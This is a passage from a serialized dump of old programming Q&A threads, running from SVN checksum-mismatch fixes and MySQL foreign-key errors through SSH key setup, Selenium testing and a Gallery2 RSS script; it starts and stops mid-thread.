is as follows:\\n\\nCAVEAT: Make sure your local copy is the best known version, AND that anyone else on your project knows what you\\'re doing!  (in case this wasn\\'t obvious already).\\n\\nif you know your local copy of the file is \"the good one\" you can directly delete the file from the SVN server and then force commit your local copy.  \\n\\nsyntax for direct deletion:\\n\\nsvn delete -m \"deleting corrupted file XXXX\" svn+ssh://username@svnserver/path/to/XXXX\\n\\ngood luck!\\n\\nJ\\n', \"here's how i fixed the issue - v simple, but as per jsh above, need to be sure your copy is the best one.\\n\\nsimply\\n\\n\\nmake a copy all problem files, in the same folder.\\ndelete the old ones with svn rm\\ncommit. \\nthen rename the copies back to the original file names.\\ncommit again.\\n\\n\\nsuspect this probably kills all sorts of revision history on that file, so it's a pretty ugly way to go about it...\\n\", 'I\\'ve observed a lot of solutions from patching .svn/entries file to fresh checkout.\\n\\nIt can be a new way (thank to my collegue):\\n\\n- go to work directory where recorder/expected checksum issue occured\\n- call \"svn diff\" and make sure that there isnt any local modifications\\n- cd ..\\n- remove trouble file\\'s directory with \"rm -rf\"\\n- issue \"svn up\" command, svn client will restore new fresh files copies\\n\\n', 'Matt, there is easier way than you described - modifying checksum in .svn/entries file. Here is full description:\\nhttp://maymay.net/blog/2008/06/17/fix-subversion-checksum-mismatch-error-by-editing-svnentries-file/\\n', \"One other easy way....\\n\\n\\nUpdate your project to get latest version\\ncheckout the same version in an other folder\\nreplace .svn folder from the new checkout to the working copy  ( i've replaced .svn-base files )\\n\\n\", '\\nCheck out only folder with problematic file from repository to some other location.\\nMake sure .svn\\\\text-base\\\\&lt;problematic file&gt;.svn-base is identical to one checked out.\\nMake sure problematic file section (all lines of the section) in .svn\\\\entries is identical to one checked out.\\n\\n', \"You won't believe this, but I have actually fixed my error by removing the &lt;scm&gt;...&lt;/scm&gt; stance from the offending pom.xml file I was hoping to check in. It contained the URL of the subversion repository it is checked in (this is what the Maven setting is for!), but somehow it generated a faulty checksum for the file while checking in.\\n\\nI literally tried all aforementioned methods of fixing this, but to no avail. Did I encounter a very rare situation in where the checksum generator is not robust enough?\\n\", \"I also stumbled upon this issue and was trying to look for quick solutions, tried some of the solution given in this thread.\\nThis is how I resolved this issue in my development environment (to me it was minimal change):\\n\\n1- Locally deleted directory in which the file got corrupted (WEB-INF):\\n\\n svn: Checksum mismatch for 'path-to-folder\\\\WEB-INF\\\\web.xml':\\n   expected:  d60cb051162e4a6790a3ea0c9ddfb434\\n     actual:  16885ded2cbc1adc250e4cbbc1427546\\n\\n\\n2- Copied and pasted directory (WEB-INF) from a fresh checkout \\n\\n3- Did svn up, now Eclipse/TortoiseSVN started showing conflict in this directory\\n\\n4- Marked conflict as Resolved\\n\\nThis worked, I was able to update, commit earlier corrupted web.xml\\n\", \"In my case the sum was different. All I've done was:\\n\\n1) Make Check Out to separate folder\\n\\n2) Replace by file from this folder in .svn directory with my project problem-file which was said in svn-client error message \\n\\n3) ..Profit!\\n\", 'As an alternative to checking out a fresh copy (which I also had to do after trying all other options) and than merging all your changes which you previously saved backed into it, the following approach worked the same way, but saved me a considerable amount of time, and possibly some errors:\\n\\n\\nCheck out a fresh working copy\\nCopy .svn folder from you fresh copy into your corrupt copy\\nVoila\\n\\n\\nOf course, you should backup your original corrupt working copy just in case. In my case, I was free to remove it after I was done, as everything went fine.\\n', '1) Go to the folder causing problem\\n2) Execute command svn update --set-depth empty\\n3) This folder will empty and revert the empty folder.\\n4) sync with the svn and update.\\n\\nThis work for me.\\n', 'This will happens when the .svn folder corrupted.\\nSolution:\\nRemove the entire folder of the file contains and checkout the folder again.\\n', \"Although this is an old issue, I thought I would give my 2 cents as well, since Ive just wrestled with the problem for more than an hour.\\n\\nThe solutions above either didn't work for me, or seemed over-complicated.\\n\\nMy solution was simply to remove all svn folders from the project.\\n\\nfind . -name .svn -exec rm -rf {} \\\\;\\n\\nAfter this, I did simple checkout of the project again. Thus leaving all my un-committed files intact, but still got a rebuild of all the svn files.\\n\", 'I had this problem on ubuntu 14.04 and solve it by follow steps:\\n\\n\\n$ cd /var/www/myProject\\n$ svn upgrade\\n$ svn update\\n\\n\\nafter these steps i could commit file without error.\\n'], [\"In a .net system I'm building, there is a need for automated e-mail notifications. These should be editable by an admin. What's the easiest way to do this? SQL table and WYSIWIG for editing?\\n\\n\\n\\nThe queue is a great idea. I've been throwing around that type of process for awhile with my old company.\\n\", \"Are you just talking about the interface and storage, or the implementation of sending the emails as well?\\r\\n\\r\\nYes, a SQL table with FROM, TO, Subject, Body should work for storage and, heck, a textbox or even maybe a RichText box should work for editing.\\r\\n\\r\\nOr is this a web interface?\\r\\n\\r\\nFor actually sending it, check out the System.Web.Mail namespace, it's pretty self explanatory and easy to use :)\", \"From a high level, yes.  :D  The main thing is some place to store the templates.  A database is a great option unless you're not already using one, then file systems work fine.\\r\\n\\r\\nWSIWIG editors (such as fckeditor) work well and give you some good options regarding the features that you allow.\\r\\n\\r\\nSome sort of token replacement system is also a good idea if you need it.  For example, if someone puts %FIRSTNAME% in the email template, the code that generates the email can do some simple pattern matching to replace known tokens with other known values that may be dynamic based on user or other circumstances.\", 'I am thinking that if these are automated notifications, then this means they are probably going out as a result of some type of event in your software. If this is a web based app, and you are going to have a number of these being sent out, then consider implementing an email queue rather than sending out an email on every event.\\r\\n\\r\\nA component can query the queue periodically and send out any pending items.', '\\n  Adam Haile writes:\\n  \\n  \\n    check out the System.Web.Mail namespace\\n  \\n\\n\\nBy which you mean System.Net.Mail in .Net 2.0 and above :)\\n', 'How about using the new Workflow components in .Net 3.0 (and 3.5)? That is what we use in combination with templates in my current project. The templates have the basic format and the the tokens that are replaced with user information.\\n'], ['I\\'ve got a table that is supposed to track days and costs for shipping product from one vendor to another. We (brilliantly :p) stored both the shipping vendors (FedEx, UPS) with the product handling vendors (Think... Dunder Mifflin) in a \"VENDOR\" table. So, I have three columns in my SHIPPING_DETAILS table that all reference VENDOR.no. For some reason MySQL isn\\'t letting me define all three as foreign keys. Any ideas?\\n\\nCREATE TABLE SHIPPING_GRID(  \\n    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY COMMENT \\'Unique ID for each row\\',  \\n    shipping_vendor_no INT(6) NOT NULL COMMENT \\'Foreign key to VENDOR.no for the shipping vendor (vendors_type must be 3)\\',  \\n    start_vendor_no INT(6) NOT NULL COMMENT \\'Foreign key to VENDOR.no for the vendor being shipped from\\',  \\n    end_vendor_no INT(6) NOT NULL COMMENT \\'Foreign key to the VENDOR.no for the vendor being shipped to\\',  \\n    shipment_duration INT(1) DEFAULT 1 COMMENT \\'Duration in whole days shipment will take\\',  \\n    price FLOAT(5,5) NOT NULL COMMENT \\'Price in US dollars per shipment lbs (down to 5 decimal places)\\',  \\n    is_flat_rate TINYINT(1) DEFAULT 0 COMMENT \\'1 if is flat rate regardless of weight, 0 if price is by lbs\\',  \\n    INDEX (shipping_vendor_no),  \\n    INDEX (start_vendor_no),  \\n    INDEX (end_vendor_no),  \\n    FOREIGN KEY (shipping_vendor_no) REFERENCES VENDOR (no),  \\n    FOREIGN KEY (start_vendor_no) REFERENCES VENDOR (no),  \\n    FOREIGN KEY (end_vendor_no) REFERENCES VENDOR (no)  \\n) TYPE = INNODB;\\n\\n\\nEdited to remove double primary key definition...\\n\\n\\n\\nYeah, unfortunately that didn\\'t fix it though. Now I\\'m getting:\\n\\n\\n  Can\\'t create table\\n  \\'./REMOVED MY DB NAME/SHIPPING_GRID.frm\\'\\n  (errno: 150)\\n\\n\\nDoing a phpinfo() tells me this for mysql:\\n\\n\\n  Client API version    5.0.45\\n\\n\\nYes, the VENDOR.no is type int(6).\\n', \"You defined the primary key twice. Try:\\n\\nCREATE TABLE SHIPPING_GRID(  \\n    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY COMMENT 'Unique ID for each row',  \\n    shipping_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the shipping vendor (vendors_type must be 3)',  \\n    start_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to VENDOR.no for the vendor being shipped from',  \\n    end_vendor_no INT(6) NOT NULL COMMENT 'Foreign key to the VENDOR.no for the vendor being shipped to',  \\n    shipment_duration INT(1) DEFAULT 1 COMMENT 'Duration in whole days shipment will take',  \\n    price FLOAT(5,5) NOT NULL COMMENT 'Price in US dollars per shipment lbs (down to 5 decimal places)',  \\n    is_flat_rate TINYINT(1) DEFAULT 0 COMMENT '1 if is flat rate regardless of weight, 0 if price is by lbs',  \\n    INDEX (shipping_vendor_no),  \\n    INDEX (start_vendor_no),  \\n    INDEX (end_vendor_no),  \\n    FOREIGN KEY (shipping_vendor_no) REFERENCES VENDOR (no),  \\n    FOREIGN KEY (start_vendor_no) REFERENCES VENDOR (no),  \\n    FOREIGN KEY (end_vendor_no) REFERENCES VENDOR (no)  \\n) TYPE = INNODB;\\n\\n\\nThe VENDOR primary key must be INT(6), and both tables must be of type InnoDB.\\n\", 'I ran the code here, and the error message showed (and it is right!) that you are setting id field twice as primary key. ', '\\n  Can you provide the definition of the\\n  VENDOR table\\n\\n\\nI figured it out. The VENDOR table was MyISAM... (edited your answer to tell me to make them both INNODB ;) )\\n\\n(any reason not to just switch the VENDOR type over to INNODB?)\\n'], [\"I'm suddenly back to WinForms, after years of web development, and am having trouble  with something that should be simple.  I have an ArrayList of business objects bound to a  Windows Forms DataGrid.  I'd like the user to be able to edit the cells, and when finished,  press a Save button.  At that point I'd like to iterate the all the rows and columns in the  DataGrid to find any changes, and save them to the database.  But I can't find a way to  access the DataGrid rows.  \\n\\nI'll also want to validate individual cells real time, as they are edited, but I'm pretty  sure that can be done.  (Maybe not with an ArrayList as the DataSource?)  But as for iterating the DataGrid, I'm quite surprised it doesn't seem possible.\\n\\nMust I really stuff my business objects data into datatables in order to use the datagrid?  \\n\", 'foreach(var row in DataGrid1.Rows)\\n{\\n  DoStuff(row);\\n}\\n//Or ---------------------------------------------   \\nforeach(DataGridRow row in DataGrid1.Rows)\\n{\\n  DoStuff(row);\\n}\\n//Or ---------------------------------------------\\nfor(int i = 0; i&lt; DataGrid1.Rows.Count - 1; i++)\\n{\\n  DoStuff(DataGrid1.Rows[i]);\\n}\\n\\n', \"\\r\\n  Is there anything about WinForms 3.0 that is so much better than in 1.1\\r\\n\\r\\n\\r\\nI don't know about 3.0, but you can write code in VS 2008 which runs on the .NET 2.0 framework. (So, you get to use the latest C# language, but you can only use the 2.0 libraries)\\r\\n\\r\\nThis gets you Generics (List&lt;DataRow&gt; instead of those GodAwful ArrayLists) and a ton of other stuff, you'll literally end up writing 3x less code.\", 'object cell = myDataGrid[row, col];\\n\\n', 'Aha, I was really just testing everyone once again!  :)  The real answer is, you rarely need to iterate the datagrid.  Because even when binding to an ArrayList, the binding is 2 way.  Still, it is handy to know how to itereate the grid directly, it can save a few lines of code now and then.  \\n\\nBut NotMyself and Orion gave the better answers:  Convince the stakeholders to move up to a higher version of C#, to save development costs and increase maintainability and extensability.\\n'], ['I\\'ve been using a lot of new .NET 3.5 features in the work that I\\'ve been doing, lately. The application that I\\'m building is intended for distribution among consumers who will probably not have the latest version (or perhaps any version) of the .NET framework on their machines.\\r\\nI went to go download the .NET 3.5 redistributable package only to find out that it\\'s almost 200 MB! This is unacceptable for my application, because it\\'s supposed to be a quick and painless consumer application that installs quickly and keeps a low profile on the user\\'s machine. For users that have .NET 3.5 already installed, our binary downloads have been instantaneous, so far. This 200 MB gorilla will more than quadruple the size of the download. Is there any other option than this redistributable package that I can use to make sure the framework is on the machine that won\\'t take the user out of our \"quick and painless\" workflow? Our target time from beginning of download to finalizing the install is less than two minutes. Is it just not possible for someone who doesn\\'t already have .NET installed?', \"That's one of the sad reasons i'm still targeting .net 2.0 whenever possible :/\\n\\nBut people don't neccessarily need the full 200 MB Package. There is a 3 MB Bootstrapper which will only download the required components:\\n\\n.net 3.5 SP1 Bootstrapper\\n\\nHowever, the worst case scenario is still a pretty hefty download. Also, see this article for a more detailed explanation on the size and an alternative workaround to the size problem.\\n\\nAddition: Since answering this question, Scott Hanselman created SmallestDotNet.com, which will determine the smallest required download. Doesn't change the worst case scenario, but is still useful to know.\\n\", \"Have you looked at the .NET Framework Client Profile? It is much smaller than the full redistributable package and is optimized for delivering just the functionality needed for smart clients.\\r\\n\\r\\nHere is a nice overview.\\r\\n\\r\\nI don't know if this will keep the download under two minutes or not, but it should get you quite a bit closer.\", 'Also, it is worth including (in some fashion) the Service Pack downloads as well. In fact, depending on how your executables are built, you might be forced to install the Framework and the Service Packs.', 'Once .NET Framework 3.5 SP1 comes out (should be fairly soon) there will be a second option of frameworks, namely the \"Client Profile\", which is a cut-down framework that only weighs in about about 30Mb from memory. It doesn\\'t include all of the namespaces and classes of the full framework, but should be enough for most common apps in theory. It can be upgraded to the full framework if necessary (eg. if an update to your software introduces a new dependency)\\r\\n\\r\\nMore more information, see here: BCL Team blog', \"For the record, .Net Framework 3.5 SP1 is required for Microsoft SQL Server 2008 to install and RTM'd around the same time as the release this week. Still a hefty install but you can extract the client profile from it. Just not to sure how.\", 'The Client Profile has got better (and smaller) in .NET 4 see \\n\\n\\nTowards a Smaller .NET 4 - Details on the Client Profile and Downloading .NET \\nWhat\\x80\\x99s new in .NET Framework 4 Client Profile RTM\\n.NET Framework Client Profile (MSDN)\\n\\n'], [\"I have a ASP.NET application that we've written our own logging module for.\\n\\nMy question is, where is the standard place to write a log file to? I.e. the website will be running as the anonymous user identity (e.g. IUSR on IIS7) and I need a place where I know it'll have permission to write to.\\n\\nCheers,\\n\", \"App_Data folder on the root of the project. It isn't served to web requests; so other people can't snoop for it.\", 'I would suggest putting the log file onto a seperate disk, though should give you a little performance gain so that your not trying to both read and write to the same disk as the website. If you cannot put the log file on a seperate disk, then I would simply choose a folder of your choice.\\n\\nIn any case, you will have to give the \"Network Service\" account \"Modify\" permissions to the desired folder.\\n\\nIf on the other hand, you have access to a databse, then log the information there. It will be much quicker than accessing the hard drive and won\\'t be publically available. You\\'ll also be able to report from the data quite easily.\\n', \"I'm not in a position to modify the permissions on folders (especially outside of the virtual directory home folder), and don't already have an App_Data folder, so am a bit hesitant to go with that. \\n\\nSo for the moment I'm going with the CommonApplicationData Folder. \\n\\n\\nOn Vista/Server 2008 this is C:\\\\ProgramData\\\\\\nOn XP/Server 2003 this is C:\\\\Documents and Settings\\\\All Users\\\\Application Data\\\\\\n\\n\", \"\\n  I'm not in a position to modify the permissions on folders (especially outside of the virtual directory home folder), and don't already have an App_Data folder, so am a bit hesitant to go with that.\\n\\n\\nIf you have a website, you clearly have a folder somewhere.  Can you not add a (non-web-facing) subfolder?  It seems like that would be a more appropriate place to put your logs than dumping them into a global, shared folder.\\n\", \"You could also log to the Windows Event log or to a table in a database.  How often are people looking at the event log?  If it's being examined on a regualr basis, writing to a table amkes the reporting back much easier as it's trivial to reverse the order and only show the last X events for the current time period.  The Windows Event log you can also query the Windows Event Log through PowerShell or with LogParser.\\n\", 'Push the app_data is the best idea, just bear in mind, when the publishing the projects, if the option \"Delete all existing files before publishing\" is ticked, then the current data in the folder will be gone. The workaround is to skip the deletion of app_data folder. \\n\\nAnother option to do logging is to use some existing framework such as Log4net. \\n'], ['I have some code for starting a thread on the .NET CF 2.0:\\n\\nThreadStart tStart = new ThreadStart(MyMethod);\\nThread t = new Thread(tStart);\\nt.Start();\\n\\n\\nIf I call this inside a loop the items complete out of order. How do introduce a wait after t.Start(), so that the work on the thread completes before the code continues? Will BeginInvoke/EndInvoke be a better option for this than manually creating threads?\\n', \"If I'm reading this properly, you're starting work items on bunch of threads but you're concerned that the threads are completing out of order, and, would prefer to wait until each thread completes in the order they were started ? \\n\\nIf this is the case then I'm not sure why you're creating a thread per work item. Maybe you could expand?\\n\\nIf you did need to wait for a thread to complete the you could just do:\\n\\nt.Join();\\n\\n\", \"How much order do you need to impose on the threads? If you just need all of the work started in the loop to finish before the code continues, but you don't care about the order the work within the loop finishes, then calling Join is the answer. To add more detail to Kevin Kenny's answer, you should call Join outside the loop. This means you will need a collection to hold references to the threads you started:\\n\\n// Start all of the threads.\\nList&lt;Thread&gt; startedThreads = new List&lt;Thread&gt;();\\nforeach (...) {\\n  Thread thread = new Thread(new ThreadStart(MyMethod));\\n  thread.Start();\\n  startedThreads.Add(thread);\\n}\\n\\n// Wait for all of the threads to finish.\\nforeach (Thread thread in startedThreads) {\\n  thread.Join();\\n}\\n\\n\\nIn contrast, if you called Join inside the loop, the result would basically be the same as not using threads at all. Each iteration of the loop body would create and start a thread but then immediately Join it and wait for it to finish.\\n\\nIf the individual threads produce some result (write a message in a log, for example) then the messages may still appear out of order because there's no coordination between the threads. It is possible to get the threads to output their results in order by coordinating them with a Monitor.\\n\", 'Another way of waiting for a thread to finish is using an AutoResetEvent.\\n\\nprivate readonly AutoResetEvent mWaitForThread = new AutoResetEvent(false);\\n\\nprivate void Blah()\\n{\\n    ThreadStart tStart = new ThreadStart(MyMethod);\\n    Thread t = new Thread(tStart);\\n    t.Start();\\n\\n    //... (any other things)\\n    mWaitForThread.WaitOne();\\n}\\n\\nprivate void MyMethod()\\n{\\n     //... (execute any other action)\\n     mWaitForThread.Set();\\n}\\n\\n'], ['What is a good way to perform animation using .NET?\\n\\nI would prefer not to use Flash if possible, so am looking for suggestions of ways which will work to implement different types of animation on a new site I am producing.\\n\\nThe new site is for a magician, so I want to provide animated buttons (Cards turning over, etc.) and also embed video.  Is it possible to do this without using Flash or is this the only real solution?  I would like to keep it as cross-platform and standard as possible.\\n', \"JavaScript is probably the way to go if you want to avoid Flash. Check this: http://www.webreference.com/programming/javascript/java_anim/\\n\\nIt won't work for embedded video, though, so you're stuck with Flash for that (or Silverlight, or QuickTime).\\n\", 'Silverlight springs to mind as an obvious choice if you want to do animation using .NET on the web. It may not cover all platforms but will work in IE and FireFox and on the Mac.\\n', 'Have a look at the jQuery cross browser JavaScript library for animation (it is what is used on Stack Overflow). The reference for it can be found at http://visualjquery.com/1.1.2.html.\\n\\nUnfortunately without Flash, Silverlight or another plug-in cross system video support is limited.\\n', 'Silverlight is the answer and Moonlight will be the linux equivalent and available shortly. We have done some beta testing on moonlight and found it fairly stable at with most of the Silverlight work we do.\\n'], ['What tools would you recommend for setting up CI for build and deployment of multiple websites built on DotNetNuke using SVN for source control? \\n\\nWe are currently looking at configuring Cruise Control to work with NAnt, NUnit, NCover and Trac as a test case. What other combinations would worth investigating?\\n\\nWe have full control of our development environment so using some form of CI is certain here but I would also like to convince our production services team that they can reliably deploy to the system test, uat and even production environments using these tools.\\n', \"I would have a look at Team City http://www.jetbrains.com/teamcity/index.html\\nI know some people who are looking in to this and they say good things about it.\\n\\nMy companies build process is done in FinalBuilder so I'm going to be looking at their server soon.\\n\\nCC is quite good in that you can have one CC server monitor another CC server so you could set up stuff like - when a build completes on your build server, your test server would wake up, boot up a virtual machine and deploy your application.  Stuff like that.\\n\", \"We use CruiseControl with NUnit, NCover, FxCop, SVN and some custom tools we wrote ourselves to produce the reports. In my opinion it has proven (over the last few years) to be an excellent combination.\\n\\nIt's frustrating that MS restricts all of its integration tools to VSTS.  Its test framework is as good as NUnit, but you can't use its code coverage tools or anything else.\\n\\nI'd check out XNuit - it's looking pretty promising (but currently lacking UI).\\n\\nWe automate nightly builds, and you could automate UAT and manual test builds, but I'm not sure that we'd ever want to automate the release to our production servers. Even if it were any change would be important enough that someone would have to watch over it anyway.\\n\", \"Microsoft loosened it's constraint on the Testing Platform by including it in Visual Studio 2008 Professional and allowing for the tests to be run from the command line with Framework 3.5 installed. We did a crossover for a client recently and so far they have been able to run all the tests without the need for NUnit.\\n\", 'We use CruiseControl.NET running msbuild scripts. Msbuild is responsible for updating from SVN on every commit, compiling, and running FxCop and NCover/NUnit.\\n', \"Take a look at Hudson. It's highly customizable, and, IMHO, easier than CruiseControl.\\n\", \"I would recommend you take a look at NAnt + NUnit ( + NCover) + TeamCity with SVN for your build system. There is actually a very nice article describing this configuration at Pete W's idea book (Sorry, this link doesn't exist anymore!)\\n\"], ['How do I setup Public-Key Authentication for SSH?\\n', 'For windows this is a good introduction and guide\\n\\nHere are some good ssh-agents for systems other than linux.\\n\\n\\nWindows - pageant\\nOS X - SSHKeychain\\n\\n', \"If you have SSH installed, you should be able to run..\\n\\nssh-keygen\\n\\n\\nThen go through the steps, you'll have two files, id_rsa and id_rsa.pub (the first is your private key, the second is your public key - the one you copy to remote machines)\\n\\nThen, connect to the remote machine you want to login to, to the file ~/.ssh/authorized_keys add the contents of your that id_rsa.pub file.\\n\\nOh, and chmod 600 all the id_rsa* files (both locally and remote), so no other users can read them:\\n\\nchmod 600 ~/.ssh/id_rsa*\\n\\n\\nSimilarly, ensure the remote ~/.ssh/authorized_keys file is chmod 600 also:\\n\\nchmod 600 ~/.ssh/authorized_keys\\n\\n\\nThen, when you do ssh remote.machine, it should ask you for the key's password, not the remote machine.\\n\\n\\n\\nTo make it nicer to use, you can use ssh-agent to hold the decrypted keys in memory - this means you don't have to type your keypair's password every single time. To launch the agent, you run (including the back-tick quotes, which eval the output of the ssh-agent command)\\n\\n`ssh-agent`\\n\\n\\nOn some distros, ssh-agent is started automatically. If you run echo $SSH_AUTH_SOCK and it shows a path (probably in /tmp/) it's already setup, so you can skip the previous command.\\n\\nThen to add your key, you do\\n\\nssh-add ~/.ssh/id_rsa\\n\\n\\nand enter your passphrase. It's stored until you remove it (using the ssh-add -D command, which removes all keys from the agent)\\n\"], [\"The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it? \\n\", \"We use Selenium Core, but are switching gradually to Selenium RC which is much nicer and easier to manage. We have written lots of custom code to make the tests run on our Continuous Integration servers, some of them in parallel suites to run faster. \\n\\nOne thing you'll find is that Selenium seems to restart the browser for each test (you can set it not to do this, but we got memory problems when we did that). This can be slow in Firefox, but is not too bad in IE (one time I'm thankful for Bill Gates's OS integraion).\\n\", \"We are using QuickTestPro.  So far it is effective, but the browser selection is limited.  The nicest part is the ability to record your browser's activity, and convert it into a scriptable set of steps.  There is also a nice .Net addin so if you have any validation code you need to do for the different stages of your test, you can write methods in an assembly and call them from your script.\\n\", \"Well, if you've designed your application properly, you won't have scads of logic inside the UI anyway. It makes much more sense to separate the actual work getting done into units separate from the UI, and then test those. \\n\\nIf you do that, then the only code in the UI will be code that invokes the backend, so simply testing the backend is sufficient.\\n\\nI have used NUnit ASP in the past (at my job), and if you insist on unit testing your UI, I would strongly advise you to use ANYTHING but NUnit ASP. It's a pain to work with, and tests tend to be invalidated (needing to be revised) after even the most minor UI changes (even if the subjects of the tests don't actually change).\\n\", \"We have been using JSunit for a while to do unit tests... it may not be the same kinds of tests you are talking about, but it is great for ensuring your JavaScript works as you expect.\\n\\nYou run it in the browser, and it can be set in an Ant build to be automatically run against a bunch of browsers on a bunch of platforms remotely (so you can ensure your code is cross-browser as well as ensure the logic is correct).\\n\\nI don't think it replaces Selenium, but it complements it well.\\n\", \"We use Watin at my place of employment, we are a .net shop so this solution made a lot of sense.  We actually started with Watir (the original ruby implementation) and switched after.  It's been a pretty good solution for us so far\\n\", \"I've used WATIR, which is pretty good. I liked it because it's Ruby and allows for testing interactivity, available elements and source code parsing. I haven't used it for a while but I assume it's gotten better.\\n\\nIt's supposedly being ported to Firefox and Safari, but that's been happening for a while now.\\n\", 'Check out Canoo Web Test.  It is open source and built on the ANT framework.\\n\\nI spent some time working with it for a graduate course on Software QA and it seems to be a pretty powerful testing tool.\\n', 'Selenium Grid can run your web tests across multiple machines in parallel, which can speed up the web testing process\\n', \"I mostly use CubicTest, which is an eclipse plugin that lets you define tests graphically. It can export/run tests through several libraries, including watir and selenium. Most people just use the Selenium runner though.\\n\\nFull disclosure: I'm one of the developers, so I'm kind of biased :)\\n\\nTake a closer look here: cubictest.openqa.org\\n\\n-Erlend\\n\", \"Selenium is for Integration testing, not Unit testing. It's a subtle, but important difference. The usage I usually see is for sanity checking a build. i.e., have a test that logs in, a test that (for example) submits a story, makes a comment, etc.\\n\\nThe idea is that you're testing to see if the whole system is working together before deployment, rather than have a user discover that your site is broken.\\n\", \"I'm a huge fan of Selenium. Saying 'unit-testing your web ui' isn't exactly accurate as some of the comments have mentioned. However, I do find Selenium to be incredibly useful for performing those sort of acceptance and sanity tests on the UI.\\n\\nA good way to get started is using Selenium IDE as part of your development. Ie, just have the IDE open as you're developing and write your test as you go to cut down on your dev time. (Instead of having to manually go through the UI to get to the point where you can test whatever you're working on, just hit a button and Selenium IDE will take care of that for you. It's a terrific time-saver!)\\n\\nMost of my major use case scenarios have Selenium RC tests to back them up. You can't really think of them as unit-tests along the lines of an xUnit framework, but they are tests targetted to very specific functionality. They're quick to write (especially if you implement common methods for things like logging in or setting up your test cases), quick to run, and provide a very tight feedback loop. In those senses Selenium RC tests are very similar to unit-tests.\\n\\nI think, like anything else, if you put the effort into properly learning a test tool (eg, Selenium), your effort will pay off in spades. You mention that your company already uses Selenium to do UI testing. This is great. Work with it. If you find Selenium hard to use, or confusing, stick with it. The learning curve really isn't all that steep once you learn the API a little bit.\\n\\nIf I'm working on a web app, its rare for me to write a significant amount of code without Selenium RC tests to back it up. That's how effective I find Selenium. :) (Hopefully that'll answer your question..)\\n\", 'We use Visual Studio 2008 Tester Edition. \\n\\nPros:\\nVery good at capturing user interaction\\n\\nCaptures Ajax calls\\n\\nIt is very easy to map user input to a database, XML or CSV file\\n\\nThe captured test can be converted to C# for more control\\n\\nThe same tests can be used for load testing and code coverage\\n\\nCons:\\n\\nVS2008 Tester Edition is a seperate SKU from the normal Developer Edition, which means extra cost\\n\\nYou may be alergic to Microsoft ;-)\\n\\nWe have used it very effectively on projects, however there a lot of effort involved in keeping tests up to date, every time you change a screen the test may need to be re-recorded\\n\\nWe tend to keep the tests short and sharp, do one thing and get out instead of recording 10 minutes worth of clicking around in a single test.\\n\\nWe have a few standard UI test types:\\n\\nMenu Test: Log in as a specific user (or user type/role) and make sure all the required menu items are available\\n\\nValidation Test: Open a page and click save without entering any data, ensure that all the validation warnings appear. Complete required fields one at a time and check that the warning messages disappear when they are supposed to.\\n\\nSearch Test: Search using data from your database or a data file and ensure the correct data is returned by the search\\n\\nData Entry Test: Create new recrords from a data file, cleanup the database to allow tests to run multiple times\\n\\nUI Testing is quite time consuming but the comfort feeling you get when a few hundred tests pass before you release a new version is priceless.\\n', 'We use WatiN for system testing, and QUnit for JavaScript unit testing.\\n', 'Molybdenum is built over Selenium and has some additional features.\\n', 'We currently use Silk4J - a Java centric approach to testing Web UI. It can test Flash, Flex, AIR, Silver Light, Win32, HTML, and a few other applications.\\n\\nSince Silk4J can control Win32 apps it can control browser dialogs directly, which is a step above what Selenium can control and is especially useful for download prompts.\\n'], ['After a couple hours fighting with the Gallery2 RSS module and getting only the message, \"no feeds have yet been defined\", I gave up.  Based on a Google search for \"no feeds have yet been defined\", this is a pretty common problem.  Do you have any tips and/or tricks for getting the Gallery2 RSS module to work?  Or any tips for a relatively-PHP-ignorant developer trying to debug problems with this PHP application?\\n', 'My eventual (and hopefully temporary) solution to this problem was a Python CGI script.  My script follows for anyone who might find it useful (despite the fact that this is a total hack).  \\n\\n#!/usr/bin/python\\n\"\"\"A CGI script to produce an RSS feed of top-level Gallery2 albums.\"\"\"\\n\\n#import cgi\\n#import cgitb; cgitb.enable()\\nfrom time import gmtime, strftime\\nimport MySQLdb\\n\\nALBUM_QUERY = \\'\\'\\'\\n    select g_id, g_title, g_originationTimestamp\\n    from g_Item\\n    where g_canContainChildren = 1 \\n    order by g_originationTimestamp desc\\n    limit 0, 20\\n    \\'\\'\\'\\n\\nRSS_TEMPLATE = \\'\\'\\'Content-Type: text/xml\\n\\n&lt;?xml version=\"1.0\"?&gt;\\n&lt;rss version=\"2.0\"&gt;\\n  &lt;channel&gt;\\n    &lt;title&gt;TITLE&lt;/title&gt;\\n    &lt;link&gt;&lt;http://example.com/gallery2/main.php&gt;&lt;/link&gt;\\n    &lt;description&gt;DESCRIPTION&lt;/description&gt;\\n    &lt;ttl&gt;1440&lt;/ttl&gt;\\n%s\\n  &lt;/channel&gt;\\n&lt;/rss&gt;\\n\\'\\'\\'\\n\\nITEM_TEMPLATE = \\'\\'\\'\\n    &lt;item&gt;\\n      &lt;title&gt;%s&lt;/title&gt;\\n      &lt;link&gt;&lt;http://example.com/gallery2/main.php?g2_itemId=%s&gt;&lt;/link&gt;\\n      &lt;description&gt;%s&lt;/description&gt;\\n      &lt;pubDate&gt;%s&lt;/pubDate&gt;\\n    &lt;/item&gt;\\n\\'\\'\\'\\n\\ndef to_item(row):\\n    item_id = row[0]\\n    title = row[1]\\n    date = strftime(\"%a, %d %b %Y %H:%M:%S GMT\", gmtime(row[2]))\\n    return ITEM_TEMPLATE % (title, item_id, title, date)\\n\\nconn = MySQLdb.connect(host = \"HOST\",\\n                       user = \"USER\",\\n                       passwd = \"PASSWORD\",\\n                       db = \"DATABASE\")\\ncurs = conn.cursor()\\ncurs.execute(ALBUM_QUERY)\\nprint RSS_TEMPLATE % \\'\\'.join([ to_item(row) for row in curs.fetchall() ])\\ncurs.close()\\n\\n', 'Well, I am unsure this can help you but here is a very simple RSS that was presented as solution in another topic:\\n\\nPHP RSS Builder\\n'], ['Recently I have been having issues with Firefox 3 on Ubuntu Hardy Heron.\\n\\nI will click on a link and it will hang for a while.  I don\\'t know if its a bug in Firefox 3 or a page running too much client side JavaScript, but I would like to try and debug it a bit.\\n\\nSo, my question is \"is there a way to have some kind of process explorer, or task manager sort of thing for Firefox 3?\"\\n\\nI would like to be able to see what tabs are using what percent of my processor via the JavaScript on that page (or anything in the page that is causing CPU/memory usage).  \\n\\nDoes anybody know of a plugin that does this, or something similar?  Has anyone else done this kind of inspection another way?\\n\\nI know about FireBug, but I can\\'t imagine how I would use it to finger which tab is using a lot of 